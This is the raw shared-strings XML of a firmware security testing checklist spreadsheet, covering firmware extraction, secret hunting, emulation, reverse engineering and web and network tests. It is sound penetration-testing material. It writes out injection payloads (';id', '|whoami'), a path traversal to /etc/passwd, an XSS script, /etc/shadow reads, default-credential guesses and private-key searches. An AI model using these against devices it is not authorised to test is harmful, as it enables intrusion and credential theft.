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rmware Security Tests" sheetId="2" state="visible" r:id="rId4"/>
  </sheets>
  <definedNames>
    <definedName function="false" hidden="true" localSheetId="1" name="_xlnm._FilterDatabase" vbProcedure="false">'Firmware Security Tests'!$A$1:$K$101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<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="1047" uniqueCount="536">
  <si>
    <t xml:space="preserve">Firmware Security Testing - Comprehensive Summary</t>
  </si>
  <si>
    <t xml:space="preserve">Severity Distribution</t>
  </si>
  <si>
    <t xml:space="preserve">Count</t>
  </si>
  <si>
    <t xml:space="preserve">Percentage</t>
  </si>
  <si>
    <t xml:space="preserve">Critical</t>
  </si>
  <si>
    <t xml:space="preserve">High</t>
  </si>
  <si>
    <t xml:space="preserve">Medium</t>
  </si>
  <si>
    <t xml:space="preserve">Low</t>
  </si>
  <si>
    <t xml:space="preserve">Total Tests</t>
  </si>
  <si>
    <t xml:space="preserve">100%</t>
  </si>
  <si>
    <t xml:space="preserve">Testing Phase</t>
  </si>
  <si>
    <t xml:space="preserve">Static</t>
  </si>
  <si>
    <t xml:space="preserve">Dynamic</t>
  </si>
  <si>
    <t xml:space="preserve">Network</t>
  </si>
  <si>
    <t xml:space="preserve">Hardware</t>
  </si>
  <si>
    <t xml:space="preserve">Exploitation</t>
  </si>
  <si>
    <t xml:space="preserve">Mixed</t>
  </si>
  <si>
    <t xml:space="preserve">CVSS Score Range</t>
  </si>
  <si>
    <t xml:space="preserve">Critical (9.0-10.0)</t>
  </si>
  <si>
    <t xml:space="preserve">High (7.0-8.9)</t>
  </si>
  <si>
    <t xml:space="preserve">Medium (4.0-6.9)</t>
  </si>
  <si>
    <t xml:space="preserve">Low (0.1-3.9)</t>
  </si>
  <si>
    <t xml:space="preserve">Informational (0.0)</t>
  </si>
  <si>
    <t xml:space="preserve">Category Breakdown</t>
  </si>
  <si>
    <t xml:space="preserve">Acquisition</t>
  </si>
  <si>
    <t xml:space="preserve">Analysis</t>
  </si>
  <si>
    <t xml:space="preserve">Extraction</t>
  </si>
  <si>
    <t xml:space="preserve">Secrets</t>
  </si>
  <si>
    <t xml:space="preserve">Reverse Engineering</t>
  </si>
  <si>
    <t xml:space="preserve">Web</t>
  </si>
  <si>
    <t xml:space="preserve">ID</t>
  </si>
  <si>
    <t xml:space="preserve">Test Case</t>
  </si>
  <si>
    <t xml:space="preserve">Category</t>
  </si>
  <si>
    <t xml:space="preserve">Severity</t>
  </si>
  <si>
    <t xml:space="preserve">Phase</t>
  </si>
  <si>
    <t xml:space="preserve">Tools</t>
  </si>
  <si>
    <t xml:space="preserve">Notes</t>
  </si>
  <si>
    <t xml:space="preserve">Required Tools</t>
  </si>
  <si>
    <t xml:space="preserve">Command/Steps</t>
  </si>
  <si>
    <t xml:space="preserve">OWASP Category</t>
  </si>
  <si>
    <t xml:space="preserve">CVSS Score</t>
  </si>
  <si>
    <t xml:space="preserve">Firmware from Vendor Website</t>
  </si>
  <si>
    <t xml:space="preserve">wget, curl, browser</t>
  </si>
  <si>
    <t xml:space="preserve">Download official firmware from vendor</t>
  </si>
  <si>
    <t xml:space="preserve">wget, curl</t>
  </si>
  <si>
    <t xml:space="preserve">wget https://vendor.com/firmware.bin
curl -O https://vendor.com/firmware.bin</t>
  </si>
  <si>
    <t xml:space="preserve">A05:2021 - Security Misconfiguration</t>
  </si>
  <si>
    <t xml:space="preserve">0.0</t>
  </si>
  <si>
    <t xml:space="preserve">Firmware from Support/Community Forums</t>
  </si>
  <si>
    <t xml:space="preserve">browser, web scraping</t>
  </si>
  <si>
    <t xml:space="preserve">Search support forums for firmware links</t>
  </si>
  <si>
    <t xml:space="preserve">Browser, grep</t>
  </si>
  <si>
    <t xml:space="preserve">Search vendor forums
Check community repositories
Verify firmware authenticity</t>
  </si>
  <si>
    <t xml:space="preserve">OTA Update Sniffing</t>
  </si>
  <si>
    <t xml:space="preserve">Wireshark, tcpdump, Burp Suite</t>
  </si>
  <si>
    <t xml:space="preserve">Intercept OTA firmware updates</t>
  </si>
  <si>
    <t xml:space="preserve">Wireshark, tcpdump, mitmproxy</t>
  </si>
  <si>
    <t xml:space="preserve">tcpdump -i any -w ota.pcap port 80 or port 443
wireshark ota.pcap
Setup MITM proxy</t>
  </si>
  <si>
    <t xml:space="preserve">M3 - Insecure Communication</t>
  </si>
  <si>
    <t xml:space="preserve">7.5</t>
  </si>
  <si>
    <t xml:space="preserve">Extract from Mobile Application</t>
  </si>
  <si>
    <t xml:space="preserve">jadx, apktool, MobSF</t>
  </si>
  <si>
    <t xml:space="preserve">Extract firmware URL from mobile app</t>
  </si>
  <si>
    <t xml:space="preserve">jadx, apktool</t>
  </si>
  <si>
    <t xml:space="preserve">jadx -d output/ app.apk
grep -r 'firmware\|.bin\|.img' output/
apktool d app.apk</t>
  </si>
  <si>
    <t xml:space="preserve">5.3</t>
  </si>
  <si>
    <t xml:space="preserve">Dump Firmware from Device (UART)</t>
  </si>
  <si>
    <t xml:space="preserve">Bus Pirate, UART adapter, screen</t>
  </si>
  <si>
    <t xml:space="preserve">Extract firmware via UART interface</t>
  </si>
  <si>
    <t xml:space="preserve">screen, minicom, Bus Pirate</t>
  </si>
  <si>
    <t xml:space="preserve">screen /dev/ttyUSB0 115200
minicom -D /dev/ttyUSB0
cat /proc/mtd
dd if=/dev/mtdblock0 of=firmware.bin</t>
  </si>
  <si>
    <t xml:space="preserve">M1 - Improper Platform Usage</t>
  </si>
  <si>
    <t xml:space="preserve">6.5</t>
  </si>
  <si>
    <t xml:space="preserve">Dump Firmware from Device (JTAG)</t>
  </si>
  <si>
    <t xml:space="preserve">OpenOCD, JTAGulator, Bus Pirate</t>
  </si>
  <si>
    <t xml:space="preserve">Extract firmware via JTAG interface</t>
  </si>
  <si>
    <t xml:space="preserve">OpenOCD, JTAGulator</t>
  </si>
  <si>
    <t xml:space="preserve">openocd -f interface/ftdi/buspirate.cfg -f target/arm.cfg
JTAG pin identification
Dump flash memory</t>
  </si>
  <si>
    <t xml:space="preserve">Dump Firmware from Device (SPI/I2C)</t>
  </si>
  <si>
    <t xml:space="preserve">flashrom, Bus Pirate, ch341a</t>
  </si>
  <si>
    <t xml:space="preserve">Extract firmware from flash chip</t>
  </si>
  <si>
    <t xml:space="preserve">flashrom, ch341a</t>
  </si>
  <si>
    <t xml:space="preserve">flashrom -p buspirate_spi:dev=/dev/ttyUSB0 -r firmware.bin
flashrom -p ch341a_spi -r firmware.bin</t>
  </si>
  <si>
    <t xml:space="preserve">Identify Firmware File Type</t>
  </si>
  <si>
    <t xml:space="preserve">file, binwalk</t>
  </si>
  <si>
    <t xml:space="preserve">Determine firmware format and structure</t>
  </si>
  <si>
    <t xml:space="preserve">file firmware.bin
binwalk firmware.bin
binwalk -B firmware.bin</t>
  </si>
  <si>
    <t xml:space="preserve">Analyze Firmware with Strings</t>
  </si>
  <si>
    <t xml:space="preserve">strings, grep</t>
  </si>
  <si>
    <t xml:space="preserve">Extract readable strings from firmware</t>
  </si>
  <si>
    <t xml:space="preserve">strings firmware.bin &gt; strings.txt
grep -i 'password\|key\|secret' strings.txt
strings -el firmware.bin</t>
  </si>
  <si>
    <t xml:space="preserve">A07:2021 - ID &amp; Auth Failures</t>
  </si>
  <si>
    <t xml:space="preserve">Analyze Firmware with Hexdump</t>
  </si>
  <si>
    <t xml:space="preserve">hexdump, xxd, ghex</t>
  </si>
  <si>
    <t xml:space="preserve">View firmware binary structure</t>
  </si>
  <si>
    <t xml:space="preserve">hexdump, xxd</t>
  </si>
  <si>
    <t xml:space="preserve">hexdump -C firmware.bin | less
xxd firmware.bin | less
ghex firmware.bin</t>
  </si>
  <si>
    <t xml:space="preserve">A02:2021 - Cryptographic Failures</t>
  </si>
  <si>
    <t xml:space="preserve">4.3</t>
  </si>
  <si>
    <t xml:space="preserve">Check Firmware Encryption Status</t>
  </si>
  <si>
    <t xml:space="preserve">Encryption</t>
  </si>
  <si>
    <t xml:space="preserve">binwalk, entropy</t>
  </si>
  <si>
    <t xml:space="preserve">Determine if firmware is encrypted</t>
  </si>
  <si>
    <t xml:space="preserve">binwalk</t>
  </si>
  <si>
    <t xml:space="preserve">binwalk -E firmware.bin
binwalk --entropy firmware.bin
Check for high entropy regions</t>
  </si>
  <si>
    <t xml:space="preserve">Identify Encryption Algorithm</t>
  </si>
  <si>
    <t xml:space="preserve">binwalk, strings, hexdump</t>
  </si>
  <si>
    <t xml:space="preserve">Identify encryption method used</t>
  </si>
  <si>
    <t xml:space="preserve">strings, hexdump</t>
  </si>
  <si>
    <t xml:space="preserve">strings firmware.bin | grep -i 'aes\|des\|rsa'
hexdump -C firmware.bin | grep -i cipher</t>
  </si>
  <si>
    <t xml:space="preserve">Locate Encryption Keys</t>
  </si>
  <si>
    <t xml:space="preserve">strings, grep, firmware-mod-kit</t>
  </si>
  <si>
    <t xml:space="preserve">Find hardcoded encryption keys</t>
  </si>
  <si>
    <t xml:space="preserve">strings firmware.bin | grep -E '[0-9A-Fa-f]{32,}'
grep -rab 'key' extracted_fs/
Search for key patterns</t>
  </si>
  <si>
    <t xml:space="preserve">9.8</t>
  </si>
  <si>
    <t xml:space="preserve">Decrypt Firmware</t>
  </si>
  <si>
    <t xml:space="preserve">openssl, firmware-mod-kit, custom scripts</t>
  </si>
  <si>
    <t xml:space="preserve">Decrypt encrypted firmware</t>
  </si>
  <si>
    <t xml:space="preserve">openssl, python</t>
  </si>
  <si>
    <t xml:space="preserve">openssl enc -d -aes-256-cbc -in firmware.bin.enc -out firmware.bin -K &lt;key&gt; -iv &lt;iv&gt;
Custom decryption scripts</t>
  </si>
  <si>
    <t xml:space="preserve">Extract Filesystem with Binwalk</t>
  </si>
  <si>
    <t xml:space="preserve">binwalk, firmware-mod-kit</t>
  </si>
  <si>
    <t xml:space="preserve">Extract filesystem from firmware</t>
  </si>
  <si>
    <t xml:space="preserve">binwalk -e firmware.bin
binwalk -Me firmware.bin
cd _firmware.bin.extracted/</t>
  </si>
  <si>
    <t xml:space="preserve">Extract Squashfs Filesystem</t>
  </si>
  <si>
    <t xml:space="preserve">unsquashfs, binwalk</t>
  </si>
  <si>
    <t xml:space="preserve">Extract squashfs compressed filesystem</t>
  </si>
  <si>
    <t xml:space="preserve">unsquashfs, squashfs-tools</t>
  </si>
  <si>
    <t xml:space="preserve">sudo apt install squashfs-tools
unsquashfs squashfs-root.img
binwalk -e firmware.bin</t>
  </si>
  <si>
    <t xml:space="preserve">Extract Cramfs Filesystem</t>
  </si>
  <si>
    <t xml:space="preserve">cramfsck, firmware-mod-kit</t>
  </si>
  <si>
    <t xml:space="preserve">Extract cramfs filesystem</t>
  </si>
  <si>
    <t xml:space="preserve">cramfsck</t>
  </si>
  <si>
    <t xml:space="preserve">sudo apt install cramfsprogs
cramfsck -x cramfs_dir cramfs.img</t>
  </si>
  <si>
    <t xml:space="preserve">Extract JFFS2 Filesystem</t>
  </si>
  <si>
    <t xml:space="preserve">jefferson, jffs2dump</t>
  </si>
  <si>
    <t xml:space="preserve">Extract JFFS2 filesystem</t>
  </si>
  <si>
    <t xml:space="preserve">jefferson</t>
  </si>
  <si>
    <t xml:space="preserve">sudo apt install mtd-utils
jefferson firmware.jffs2 -d output/
jffs2dump -c firmware.jffs2</t>
  </si>
  <si>
    <t xml:space="preserve">Extract UBIFS Filesystem</t>
  </si>
  <si>
    <t xml:space="preserve">ubireader, ubi_reader</t>
  </si>
  <si>
    <t xml:space="preserve">Extract UBIFS filesystem</t>
  </si>
  <si>
    <t xml:space="preserve">ubireader</t>
  </si>
  <si>
    <t xml:space="preserve">pip install ubi_reader
ubireader_extract_files firmware.ubi
ubidump firmware.ubi</t>
  </si>
  <si>
    <t xml:space="preserve">Search for Hardcoded Credentials</t>
  </si>
  <si>
    <t xml:space="preserve">grep, strings, ripgrep</t>
  </si>
  <si>
    <t xml:space="preserve">Find hardcoded passwords/keys</t>
  </si>
  <si>
    <t xml:space="preserve">grep, rg</t>
  </si>
  <si>
    <t xml:space="preserve">grep -r -i 'password\|passwd\|pwd' extracted_fs/
rg -i 'password.*=' extracted_fs/
strings -a firmware.bin | grep -i pass</t>
  </si>
  <si>
    <t xml:space="preserve">Search for API Keys</t>
  </si>
  <si>
    <t xml:space="preserve">grep, trufflehog</t>
  </si>
  <si>
    <t xml:space="preserve">Find hardcoded API keys</t>
  </si>
  <si>
    <t xml:space="preserve">grep -rE 'api[_-]?key|apikey' extracted_fs/
trufflehog filesystem --directory extracted_fs/
grep -rE '[A-Za-z0-9]{32,}' .</t>
  </si>
  <si>
    <t xml:space="preserve">Search for Private Certificates/Keys</t>
  </si>
  <si>
    <t xml:space="preserve">find, grep</t>
  </si>
  <si>
    <t xml:space="preserve">Find SSL/SSH private keys</t>
  </si>
  <si>
    <t xml:space="preserve">find extracted_fs/ -name '*.pem' -o -name '*.key'
grep -r 'BEGIN.*PRIVATE KEY' extracted_fs/
find . -name id_rsa</t>
  </si>
  <si>
    <t xml:space="preserve">9.1</t>
  </si>
  <si>
    <t xml:space="preserve">Search for Backdoor Accounts</t>
  </si>
  <si>
    <t xml:space="preserve">grep, cat</t>
  </si>
  <si>
    <t xml:space="preserve">Find backdoor user accounts</t>
  </si>
  <si>
    <t xml:space="preserve">cat extracted_fs/etc/passwd
cat extracted_fs/etc/shadow
grep -i 'backdoor\|debug' extracted_fs/etc/*</t>
  </si>
  <si>
    <t xml:space="preserve">Search for Sensitive URLs</t>
  </si>
  <si>
    <t xml:space="preserve">grep, urlextract</t>
  </si>
  <si>
    <t xml:space="preserve">Extract hardcoded URLs</t>
  </si>
  <si>
    <t xml:space="preserve">grep</t>
  </si>
  <si>
    <t xml:space="preserve">grep -rhoE 'https?://[^"\s]+' extracted_fs/ | sort -u
strings firmware.bin | grep -E '^https?://'</t>
  </si>
  <si>
    <t xml:space="preserve">Analyze Configuration Files</t>
  </si>
  <si>
    <t xml:space="preserve">Configuration</t>
  </si>
  <si>
    <t xml:space="preserve">grep, cat, less</t>
  </si>
  <si>
    <t xml:space="preserve">Review config files for sensitive data</t>
  </si>
  <si>
    <t xml:space="preserve">grep, find</t>
  </si>
  <si>
    <t xml:space="preserve">find extracted_fs/ -name '*.conf' -o -name '*.cfg'
grep -r 'password\|key\|secret' extracted_fs/etc/
cat extracted_fs/etc/config/*</t>
  </si>
  <si>
    <t xml:space="preserve">Check Default Credentials</t>
  </si>
  <si>
    <t xml:space="preserve">grep, default cred lists</t>
  </si>
  <si>
    <t xml:space="preserve">Identify default passwords</t>
  </si>
  <si>
    <t xml:space="preserve">grep, manual</t>
  </si>
  <si>
    <t xml:space="preserve">cat extracted_fs/etc/passwd
Check against default credential databases
Test admin/admin, root/root</t>
  </si>
  <si>
    <t xml:space="preserve">Identify Processor Architecture</t>
  </si>
  <si>
    <t xml:space="preserve">Architecture</t>
  </si>
  <si>
    <t xml:space="preserve">file, readelf, binwalk</t>
  </si>
  <si>
    <t xml:space="preserve">Determine CPU architecture</t>
  </si>
  <si>
    <t xml:space="preserve">file, readelf</t>
  </si>
  <si>
    <t xml:space="preserve">file extracted_fs/bin/busybox
readelf -h binary
binwalk -A firmware.bin</t>
  </si>
  <si>
    <t xml:space="preserve">Identify Endianness</t>
  </si>
  <si>
    <t xml:space="preserve">Determine big/little endian</t>
  </si>
  <si>
    <t xml:space="preserve">file binary
readelf -h binary | grep 'Data'
Check ELF header</t>
  </si>
  <si>
    <t xml:space="preserve">Analyze Binary Security Protections</t>
  </si>
  <si>
    <t xml:space="preserve">Binary Security</t>
  </si>
  <si>
    <t xml:space="preserve">checksec, readelf</t>
  </si>
  <si>
    <t xml:space="preserve">Check for NX, PIE, RELRO, stack canaries</t>
  </si>
  <si>
    <t xml:space="preserve">checksec.sh, readelf</t>
  </si>
  <si>
    <t xml:space="preserve">checksec --file=binary
readelf -l binary | grep GNU_STACK
readelf -d binary | grep BIND_NOW</t>
  </si>
  <si>
    <t xml:space="preserve">M8 - Code Tampering</t>
  </si>
  <si>
    <t xml:space="preserve">Check for Stripped Binaries</t>
  </si>
  <si>
    <t xml:space="preserve">Binary Analysis</t>
  </si>
  <si>
    <t xml:space="preserve">file, readelf, strings</t>
  </si>
  <si>
    <t xml:space="preserve">Verify if debug symbols present</t>
  </si>
  <si>
    <t xml:space="preserve">file binary
readelf -S binary | grep debug
strings binary | grep -i debug</t>
  </si>
  <si>
    <t xml:space="preserve">M7 - Reverse Engineering</t>
  </si>
  <si>
    <t xml:space="preserve">Emulate Firmware with QEMU (User Mode)</t>
  </si>
  <si>
    <t xml:space="preserve">Emulation</t>
  </si>
  <si>
    <t xml:space="preserve">qemu-user-static, chroot</t>
  </si>
  <si>
    <t xml:space="preserve">Emulate individual binaries</t>
  </si>
  <si>
    <t xml:space="preserve">qemu-user-static</t>
  </si>
  <si>
    <t xml:space="preserve">sudo apt install qemu-user-static
cp /usr/bin/qemu-arm-static extracted_fs/
sudo chroot extracted_fs/ ./qemu-arm-static /bin/sh</t>
  </si>
  <si>
    <t xml:space="preserve">Emulate Firmware with QEMU (System Mode)</t>
  </si>
  <si>
    <t xml:space="preserve">qemu-system, kernel</t>
  </si>
  <si>
    <t xml:space="preserve">Full system emulation</t>
  </si>
  <si>
    <t xml:space="preserve">qemu-system-arm</t>
  </si>
  <si>
    <t xml:space="preserve">qemu-system-arm -M versatilepb -kernel zImage -initrd initrd -hda rootfs.ext2 -append 'root=/dev/sda'</t>
  </si>
  <si>
    <t xml:space="preserve">Emulate with Firmware Analysis Toolkit (FAT)</t>
  </si>
  <si>
    <t xml:space="preserve">FAT, firmadyne, qemu</t>
  </si>
  <si>
    <t xml:space="preserve">Automated firmware emulation</t>
  </si>
  <si>
    <t xml:space="preserve">FAT, Python</t>
  </si>
  <si>
    <t xml:space="preserve">git clone https://github.com/attify/firmware-analysis-toolkit
cd firmware-analysis-toolkit
python3 fat.py firmware.bin</t>
  </si>
  <si>
    <t xml:space="preserve">Emulate with Firmadyne</t>
  </si>
  <si>
    <t xml:space="preserve">firmadyne, postgresql, qemu</t>
  </si>
  <si>
    <t xml:space="preserve">Automated network-based emulation</t>
  </si>
  <si>
    <t xml:space="preserve">firmadyne</t>
  </si>
  <si>
    <t xml:space="preserve">git clone https://github.com/firmadyne/firmadyne
./download.sh
python3 run.py -i firmware.bin</t>
  </si>
  <si>
    <t xml:space="preserve">Emulate with FirmAE</t>
  </si>
  <si>
    <t xml:space="preserve">FirmAE (Firmadyne++)</t>
  </si>
  <si>
    <t xml:space="preserve">Enhanced firmware emulation</t>
  </si>
  <si>
    <t xml:space="preserve">FirmAE</t>
  </si>
  <si>
    <t xml:space="preserve">git clone https://github.com/pr0v3rbs/FirmAE
./install.sh
./run.sh -i firmware.bin</t>
  </si>
  <si>
    <t xml:space="preserve">Emulate with Chroot</t>
  </si>
  <si>
    <t xml:space="preserve">chroot, qemu-user</t>
  </si>
  <si>
    <t xml:space="preserve">Change root emulation</t>
  </si>
  <si>
    <t xml:space="preserve">chroot</t>
  </si>
  <si>
    <t xml:space="preserve">sudo chroot extracted_fs/ /bin/sh
cp /usr/bin/qemu-arm-static extracted_fs/
sudo chroot extracted_fs/ ./qemu-arm-static /bin/sh</t>
  </si>
  <si>
    <t xml:space="preserve">Disassemble Binaries with Ghidra</t>
  </si>
  <si>
    <t xml:space="preserve">Ghidra</t>
  </si>
  <si>
    <t xml:space="preserve">Reverse engineer binaries</t>
  </si>
  <si>
    <t xml:space="preserve">ghidraRun
Import binary → Analyze → Review decompiled code
Search for vulnerabilities</t>
  </si>
  <si>
    <t xml:space="preserve">Disassemble Binaries with IDA Pro</t>
  </si>
  <si>
    <t xml:space="preserve">IDA Pro</t>
  </si>
  <si>
    <t xml:space="preserve">Advanced binary analysis</t>
  </si>
  <si>
    <t xml:space="preserve">ida binary
Analyze functions
Identify vulnerabilities
Check for command injection</t>
  </si>
  <si>
    <t xml:space="preserve">Disassemble Binaries with Radare2</t>
  </si>
  <si>
    <t xml:space="preserve">radare2, Cutter</t>
  </si>
  <si>
    <t xml:space="preserve">Open-source binary analysis</t>
  </si>
  <si>
    <t xml:space="preserve">radare2, r2</t>
  </si>
  <si>
    <t xml:space="preserve">r2 binary
aaa (analyze all)
pdf @ main
VV (visual mode)</t>
  </si>
  <si>
    <t xml:space="preserve">Analyze Binary with Binary Ninja</t>
  </si>
  <si>
    <t xml:space="preserve">Binary Ninja</t>
  </si>
  <si>
    <t xml:space="preserve">Modern disassembler</t>
  </si>
  <si>
    <t xml:space="preserve">binaryninja binary
Analyze → Review MLIL/HLIL
Identify vulnerabilities</t>
  </si>
  <si>
    <t xml:space="preserve">Identify Command Injection Vulnerabilities</t>
  </si>
  <si>
    <t xml:space="preserve">Ghidra, IDA, strings</t>
  </si>
  <si>
    <t xml:space="preserve">Find command injection flaws</t>
  </si>
  <si>
    <t xml:space="preserve">Ghidra, grep</t>
  </si>
  <si>
    <t xml:space="preserve">Search for system(), popen(), execve() calls
grep -r 'system\|popen\|exec' extracted_fs/
Analyze web CGI scripts</t>
  </si>
  <si>
    <t xml:space="preserve">A03:2021 - Injection</t>
  </si>
  <si>
    <t xml:space="preserve">Identify Buffer Overflow Vulnerabilities</t>
  </si>
  <si>
    <t xml:space="preserve">Ghidra, checksec, GDB</t>
  </si>
  <si>
    <t xml:space="preserve">Find buffer overflow bugs</t>
  </si>
  <si>
    <t xml:space="preserve">Ghidra, GDB</t>
  </si>
  <si>
    <t xml:space="preserve">Analyze strcpy(), sprintf(), gets() usage
Checksec for stack protections
Fuzz with AFL++</t>
  </si>
  <si>
    <t xml:space="preserve">A06:2021 - Vulnerable Components</t>
  </si>
  <si>
    <t xml:space="preserve">8.1</t>
  </si>
  <si>
    <t xml:space="preserve">Identify Format String Vulnerabilities</t>
  </si>
  <si>
    <t xml:space="preserve">Ghidra, IDA, GDB</t>
  </si>
  <si>
    <t xml:space="preserve">Find format string bugs</t>
  </si>
  <si>
    <t xml:space="preserve">Search for printf(), fprintf() with user input
grep -r 'printf.*%' extracted_fs/
Analyze format specifiers</t>
  </si>
  <si>
    <t xml:space="preserve">8.6</t>
  </si>
  <si>
    <t xml:space="preserve">Identify Integer Overflow Vulnerabilities</t>
  </si>
  <si>
    <t xml:space="preserve">Ghidra, static analysis</t>
  </si>
  <si>
    <t xml:space="preserve">Find integer overflow bugs</t>
  </si>
  <si>
    <t xml:space="preserve">Analyze arithmetic operations
Check for size calculations
Review malloc() size arguments</t>
  </si>
  <si>
    <t xml:space="preserve">Check ASLR Implementation</t>
  </si>
  <si>
    <t xml:space="preserve">checksec, cat /proc</t>
  </si>
  <si>
    <t xml:space="preserve">Verify ASLR status</t>
  </si>
  <si>
    <t xml:space="preserve">checksec, cat</t>
  </si>
  <si>
    <t xml:space="preserve">cat /proc/sys/kernel/randomize_va_space
checksec --file=binary
Test address randomization</t>
  </si>
  <si>
    <t xml:space="preserve">Check DEP/NX Implementation</t>
  </si>
  <si>
    <t xml:space="preserve">Verify non-executable stack</t>
  </si>
  <si>
    <t xml:space="preserve">checksec --file=binary
readelf -l binary | grep GNU_STACK
Check for NX bit</t>
  </si>
  <si>
    <t xml:space="preserve">Identify Web Server</t>
  </si>
  <si>
    <t xml:space="preserve">curl, nmap, whatweb</t>
  </si>
  <si>
    <t xml:space="preserve">Identify web server type/version</t>
  </si>
  <si>
    <t xml:space="preserve">curl, nmap</t>
  </si>
  <si>
    <t xml:space="preserve">curl -I http://device-ip/
nmap -sV -p80,443 device-ip
whatweb http://device-ip/</t>
  </si>
  <si>
    <t xml:space="preserve">Analyze Web Application Files</t>
  </si>
  <si>
    <t xml:space="preserve">Review CGI scripts and web files</t>
  </si>
  <si>
    <t xml:space="preserve">find extracted_fs/www/ -type f
grep -r 'system\|exec' extracted_fs/www/
Analyze .cgi, .php, .asp files</t>
  </si>
  <si>
    <t xml:space="preserve">Test for Command Injection in Web Interface</t>
  </si>
  <si>
    <t xml:space="preserve">Web Exploitation</t>
  </si>
  <si>
    <t xml:space="preserve">Burp Suite, curl</t>
  </si>
  <si>
    <t xml:space="preserve">Test web interface for command injection</t>
  </si>
  <si>
    <t xml:space="preserve">curl 'http://device/cgi?cmd=;id'
Test with: ;ls, |whoami, `uname -a`
Use Burp Intruder</t>
  </si>
  <si>
    <t xml:space="preserve">Test for Authentication Bypass</t>
  </si>
  <si>
    <t xml:space="preserve">Burp Suite, SQLMap</t>
  </si>
  <si>
    <t xml:space="preserve">Test for auth bypass vulnerabilities</t>
  </si>
  <si>
    <t xml:space="preserve">Test default credentials
SQL injection in login
Force browsing to admin pages</t>
  </si>
  <si>
    <t xml:space="preserve">Test for Directory Traversal</t>
  </si>
  <si>
    <t xml:space="preserve">Test for path traversal</t>
  </si>
  <si>
    <t xml:space="preserve">curl 'http://device/download?file=../../../../etc/passwd'
Test with: ../, ..\, ....//</t>
  </si>
  <si>
    <t xml:space="preserve">A01:2021 - Broken Access Control</t>
  </si>
  <si>
    <t xml:space="preserve">Test for CSRF Vulnerabilities</t>
  </si>
  <si>
    <t xml:space="preserve">Burp Suite, manual</t>
  </si>
  <si>
    <t xml:space="preserve">Test for CSRF protection</t>
  </si>
  <si>
    <t xml:space="preserve">Burp Suite</t>
  </si>
  <si>
    <t xml:space="preserve">Check for CSRF tokens
Test state-changing requests
Attempt cross-origin requests</t>
  </si>
  <si>
    <t xml:space="preserve">Test for XSS Vulnerabilities</t>
  </si>
  <si>
    <t xml:space="preserve">Burp Suite, XSStrike</t>
  </si>
  <si>
    <t xml:space="preserve">Test for cross-site scripting</t>
  </si>
  <si>
    <t xml:space="preserve">Test with: &lt;script&gt;alert(1)&lt;/script&gt;
Reflected, Stored, DOM-based XSS
xsstrike -u http://target</t>
  </si>
  <si>
    <t xml:space="preserve">7.2</t>
  </si>
  <si>
    <t xml:space="preserve">Identify Open Ports and Services</t>
  </si>
  <si>
    <t xml:space="preserve">nmap, masscan</t>
  </si>
  <si>
    <t xml:space="preserve">Scan for open services</t>
  </si>
  <si>
    <t xml:space="preserve">nmap -sV -p- device-ip
masscan device-ip -p1-65535 --rate=1000
nmap -sU device-ip</t>
  </si>
  <si>
    <t xml:space="preserve">Analyze Network Protocols</t>
  </si>
  <si>
    <t xml:space="preserve">Wireshark, tcpdump</t>
  </si>
  <si>
    <t xml:space="preserve">Capture and analyze traffic</t>
  </si>
  <si>
    <t xml:space="preserve">tcpdump -i eth0 -w capture.pcap host device-ip
wireshark capture.pcap
Analyze protocols</t>
  </si>
  <si>
    <t xml:space="preserve">Test for Unencrypted Protocols</t>
  </si>
  <si>
    <t xml:space="preserve">Identify cleartext protocols</t>
  </si>
  <si>
    <t xml:space="preserve">tcpdump -i eth0 -A port 23 or port 21
Check for Telnet, FTP, HTTP
Wireshark filters</t>
  </si>
  <si>
    <t xml:space="preserve">Sniff UART Traffic</t>
  </si>
  <si>
    <t xml:space="preserve">Bus Pirate, logic analyzer</t>
  </si>
  <si>
    <t xml:space="preserve">Monitor UART communications</t>
  </si>
  <si>
    <t xml:space="preserve">screen, minicom</t>
  </si>
  <si>
    <t xml:space="preserve">screen /dev/ttyUSB0 115200
minicom -D /dev/ttyUSB0
Logic analyzer capture</t>
  </si>
  <si>
    <t xml:space="preserve">Sniff SPI Traffic</t>
  </si>
  <si>
    <t xml:space="preserve">Logic analyzer, Bus Pirate</t>
  </si>
  <si>
    <t xml:space="preserve">Monitor SPI communications</t>
  </si>
  <si>
    <t xml:space="preserve">Bus Pirate, sigrok</t>
  </si>
  <si>
    <t xml:space="preserve">Bus Pirate SPI sniffer mode
Logic analyzer + sigrok/PulseView
Analyze SPI transactions</t>
  </si>
  <si>
    <t xml:space="preserve">Sniff I2C Traffic</t>
  </si>
  <si>
    <t xml:space="preserve">Monitor I2C communications</t>
  </si>
  <si>
    <t xml:space="preserve">Bus Pirate I2C sniffer mode
Logic analyzer capture
Decode I2C messages</t>
  </si>
  <si>
    <t xml:space="preserve">Analyze Custom Protocols</t>
  </si>
  <si>
    <t xml:space="preserve">Protocol</t>
  </si>
  <si>
    <t xml:space="preserve">Wireshark, dissectors</t>
  </si>
  <si>
    <t xml:space="preserve">Reverse engineer custom protocols</t>
  </si>
  <si>
    <t xml:space="preserve">Wireshark, Python</t>
  </si>
  <si>
    <t xml:space="preserve">Capture traffic with Wireshark
Analyze packet structure
Create custom dissector</t>
  </si>
  <si>
    <t xml:space="preserve">Test MQTT Security</t>
  </si>
  <si>
    <t xml:space="preserve">mosquitto_sub, Wireshark</t>
  </si>
  <si>
    <t xml:space="preserve">Test MQTT implementation</t>
  </si>
  <si>
    <t xml:space="preserve">mosquitto, Wireshark</t>
  </si>
  <si>
    <t xml:space="preserve">mosquitto_sub -h device-ip -t '#' -v
Test authentication
Check for TLS</t>
  </si>
  <si>
    <t xml:space="preserve">Test CoAP Security</t>
  </si>
  <si>
    <t xml:space="preserve">coap-client, Wireshark</t>
  </si>
  <si>
    <t xml:space="preserve">Test CoAP implementation</t>
  </si>
  <si>
    <t xml:space="preserve">coap-client</t>
  </si>
  <si>
    <t xml:space="preserve">coap-client -m get coap://device-ip/
Test authentication
Check DTLS usage</t>
  </si>
  <si>
    <t xml:space="preserve">Test Bluetooth Security</t>
  </si>
  <si>
    <t xml:space="preserve">hcitool, btscanner, bettercap</t>
  </si>
  <si>
    <t xml:space="preserve">Test BT/BLE security</t>
  </si>
  <si>
    <t xml:space="preserve">hcitool, gatttool</t>
  </si>
  <si>
    <t xml:space="preserve">hcitool scan
hciconfig hci0 up
gatttool -b MAC -I
bettercap -eval 'ble.recon on'</t>
  </si>
  <si>
    <t xml:space="preserve">Test Zigbee Security</t>
  </si>
  <si>
    <t xml:space="preserve">KillerBee, Ubertooth</t>
  </si>
  <si>
    <t xml:space="preserve">Test Zigbee implementation</t>
  </si>
